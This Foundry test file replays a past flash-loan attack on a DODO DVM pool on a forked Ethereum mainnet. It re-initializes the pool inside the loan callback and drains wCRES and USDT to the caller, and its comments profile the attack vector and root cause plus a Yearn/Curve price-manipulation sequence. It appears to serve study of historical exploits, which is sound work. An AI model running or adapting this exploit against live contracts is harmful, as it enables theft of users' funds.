// SPDX-License-Identifier: UNLICENSED
// !! THIS FILE WAS AUTOGENERATED BY abi-to-sol v0.5.3. SEE SOURCE BELOW. !!
pragma solidity >=0.7.0 <0.9.0;

import "forge-std/Test.sol";
import "./../interface.sol";

contract ContractTest is Test {
    uint256 wCRES_amount = 130_000_000_000_000_000_000_000;

    uint256 usdt_amount = 1_100_000_000_000;

    IERC20 wCRES_token = IERC20(0xa0afAA285Ce85974c3C881256cB7F225e3A1178a);

    USDT usdt_token = USDT(0xdAC17F958D2ee523a2206206994597C13D831ec7);
    address maintainer = 0x95C4F5b83aA70810D4f142d58e5F7242Bd891CB0;
    DVM dvm = DVM(0x051EBD717311350f1684f89335bed4ABd083a2b6);
    address mtFeeRateModel = 0x5e84190a270333aCe5B9202a3F4ceBf11b81bB01;
    uint256 lpFeeRate = 3_000_000_000_000_000;
    address mywallet = msg.sender;
    uint256 i = 1;
    uint256 k = 1_000_000_000_000_000_000;
    bool isOpenTWAP = false;
    address token1 = 0x7f4E7fB900E0EC043718d05caEe549805CaB22C8;
    address token2 = 0xf2dF8794f8F99f1Ba4D8aDc468EbfF2e47Cd7010;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("mainnet", 12_000_000); // fork mainnet block number 12000000
    }

    function testExploit() public {
        address me = address(this);
        dvm.flashLoan(wCRES_amount, usdt_amount, me, "whatever");

        //emit log_named_uint("Exploit completed, WBNB Balance",wbnb.balanceOf(mywallet));
    }

    function DVMFlashLoanCall(address a, uint256 b, uint256 c, bytes memory d) public {
        emit log_named_uint("FlashLoan WBNB Balance", wCRES_token.balanceOf(address(this)));
        dvm.init(maintainer, token1, token2, lpFeeRate, mtFeeRateModel, i, k, isOpenTWAP);
        wCRES_token.transfer(mywallet, wCRES_token.balanceOf(address(this)));
        usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));

        emit log_named_uint("After Exploit completed, wCRES Balance", wCRES_token.balanceOf(mywallet));
        usdt_token.transfer(mywallet, usdt_token.balanceOf(address(this)));
        emit log_named_uint("After Exploit completed, USDT Balance", usdt_token.balanceOf(mywallet));
    }
}

// Profile:
// Ineteraction address: t1(wCRES), t2(usdt), c0(this), a1(maintainer), a2(mtFeeRateModel), a3(mywallet)
// Victim contract: v0(dvm)
// Dapp function: flashLoan
// Attack vector: v0.flashLoan(t1, t2, c0, '')
// Callback method: Reentrancy: v0.init(a1, t1, t2, sn, a2, sn, sn, b), t1.transfer(a3, t1.balanceOf(c0)), t2.transfer(a3, t2.balanceOf(c0)), t2.transfer(a3, t2.balanceOf(c0))
// Validation assertion: t1.balanceOf(c0), t2.balanceOf(c0)
// Root cause: The flashLoan function lacks the reentrancy guard, thus allowing the attacker to re-intialize the contract.

// Profile Template:
// interaction address: t1(dai), t2(usdc), t3(usdt), 
// victim contracts: v0(yvdai), v1(curve)
// dappName: YearnFinance
// Dapp function: DEX
// Attack vector: Initialize t1 and t2, t1.approve(v0), t2.approve(v1), t3.approve(v1), v1.add_liquidity([t1.balanceOf(this), t2.balanceOf(this), 0], 0), v1.remove_liquidity_imbalance([0, 0, t3.balanceOf(this)], 0), v0.deposit(t3.balanceOf(this)), v0.earn(), v1.add_liquidity([0, 0, t3.balanceOf(this)], 0), v0.withdrawAll(), v1.remove_liquidity_imbalance([t1.balanceOf(this) + 1, t2.balanceOf(this) + 1, 0], 0)
// Callback method: NaN
// Validation assertion: v0.balanceOf(c0), v1.balanceOf(c0)
// Root cause: The liquidity pool lacks the balance check adding liquidity and removing liquidity. Logic error incurred price manipulation.